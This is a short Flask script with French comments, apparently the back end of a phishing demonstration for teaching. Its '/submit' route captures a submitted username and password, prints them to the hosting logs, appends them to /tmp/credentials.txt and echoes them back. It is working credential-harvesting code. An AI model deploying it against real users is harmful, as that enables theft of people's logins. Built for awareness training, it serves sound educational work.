from flask import Flask, request

app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    
    # 👇 CECI APPARAÎTRA DANS LES LOGS NETLIFY
    print(f"🔴 IDENTIFIANTS CAPTURÉS : Username = {username}, Password = {password}")
    
    # Optionnel : on garde l'écriture dans un fichier (même si ça ne sert à rien sur Netlify)
    with open('/tmp/credentials.txt', 'a') as f:  # /tmp/ est le seul dossier accessible en écriture
        f.write(f'Username: {username}, Password: {password}\n')
    
    # Pour la démo, on peut aussi afficher les identifiants dans la réponse (le bandeau rouge prévient déjà)
    return f'Login successful! (Démo pédagogique - Identifiants reçus : {username}/{password})'

if __name__ == '__main__':
    app.run(port=8000)
